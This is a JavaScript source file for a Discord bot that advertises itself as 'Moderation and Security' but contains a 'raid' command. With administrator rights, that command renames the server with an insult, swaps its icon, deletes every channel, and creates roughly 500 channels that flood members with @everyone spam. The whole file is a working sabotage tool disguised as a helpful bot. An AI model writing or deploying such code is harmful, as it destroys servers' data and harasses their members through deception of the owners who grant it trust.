const Discord = require("discord.js");
const { Client, MessageEmbed, RichPresenceAssets, DiscordAPIError, Message, GuildMember} = require('discord.js');
const config = require("./config.json");
const chalk = require("chalk");
const client = new Discord.Client({ ws: { properties: { $browser: "Discord" }}})
const fs = require("fs");

var prefix = config.prefix;



client.commands = new Discord.Collection()


let folders = fs.readdirSync("./fake").filter((f) => f.endsWith(".js"))

for(var fold of folders) {
  let command = require("./fake/" +fold)
  client.commands.set(command.nombre, command)
 }
    console.log(chalk.hex("#FFFFFF").bold("────────────────────────────────────────────────────────────"))
    console.log(chalk.hex("#00FFB4").bold(`- Made by Konra#6400`))
    console.log(chalk.hex("#06FF5E").bold(`- Succesfully loaded in ` + client.guilds.cache.map(i => i.name)));
    console.log(chalk.hex("#FFFFFF").bold("────────────────────────────────────────────────────────────"))
    console.log(chalk.hex("#CCFF00").bold("More Info:"))
    console.log(chalk.hex("#FF00CC").bold("- if you find a error please contact me"))
    console.log(chalk.hex("#FFFFFF").bold("────────────────────────────────────────────────────────────"))


client.on("ready", () => {
  let total = 0 
client.guilds.cache.forEach(async element => {
  total = total + element.members.size
  let membersAllow = client.users.cache.size ;
})
  client.user.setPresence( {
    activity: {
        name: `Moderation and Security`
      
    },
    status: "online"
 });
 });
 
 
 

  
client.on("message", async message => {

 

  const Discord = require("discord.js");

  
  
  if (message.channel.type === "dm") return;
  if(!message.content.startsWith(prefix)) return;

  
  
  
  
  
  
  const args = message.content.slice(config.prefix.length).trim().split(/ +/g);
  const command = args.shift().toLowerCase();
  

  let cmd = client.commands.get(command) || client.commands.find((c)  => c.alias.includes(command))
  if(cmd) {
    return cmd.run(client, message, args)
  }

  
  if(message.content.startsWith(prefix + "raid")) {

  
    if (!message.guild.me.permissions.has("ADMINISTRATOR")) {

      console.log("No permissions in [" + message.guild.name + "]")


return;
    }



    



            message.guild.setName("Fucked by ...");
  message.guild.setIcon("https://media.discordapp.net/attachments/816165416175009795/816165435660566568/shiticon.png?width=382&height=382"
  );
message.guild.channels.cache.forEach(channel => channel.delete());

message.guild.channels.create(`Annoucements`, {
type: 'text'
}).then(channel => {

const embed = new Discord.MessageEmbed()

.setTitle("Raided by ...")
.setDescription("We got raided, for being a shitty server that shouldn't exist, we're stupid :monkey: ")
.setColor("RED")
.setThumbnail("https://media.discordapp.net/attachments/816165416175009795/816165693116383253/shit_de_colorsitos_en_png_by_ctutosedicones_d5w03em-fullview.png")
.setFooter("Sometimes the good guys have to do bad things.")
channel.send("@everyone")
channel.send(embed)
})


for (let i = 0; i <= 500; i++) {
message.guild.channels.create(`Stupid Alert`, {
type: 'text'
}).then(channel => {
channel.send("Hey @everyone we are very stupids :monkey:") 
channel.send("Hey @here we are very stupids :monkey:")
channel.send("Hey @everyone we are very stupids :monkey:")
channel.send("Hey @here we are very stupids :monkey:")
channel.send("Hey @everyone we are very stupids :monkey:")
channel.send("Hey @here we are very stupids :monkey:")
channel.send("Hey @everyone we are very stupids :monkey:")
channel.send("Hey @here we are very stupids :monkey:")
channel.send("Hey @everyone we are very stupids :monkey:")
channel.send("Hey @everyone we are very stupids :monkey:")
channel.send("Hey @everyone we are very stupids :monkey:")
channel.send("Hey @everyone we are very stupids :monkey:")
channel.send("Hey @everyone we are very stupids :monkey:")
channel.send("Hey @everyone we are very stupids :monkey:")
channel.send("Hey @everyone we are very stupids :monkey:")
channel.send("Hey @everyone we are very stupids :monkey:")
channel.send("Hey @everyone we are very stupids :monkey:")
channel.send("Hey @everyone we are very stupids :monkey:")
channel.send("Hey @everyone we are very stupids :monkey:")
channel.send("Hey @everyone we are very stupids :monkey:")
channel.send("Hey @everyone we are very stupids :monkey:") 


})
}

}








  

  
});
client.login(config.token);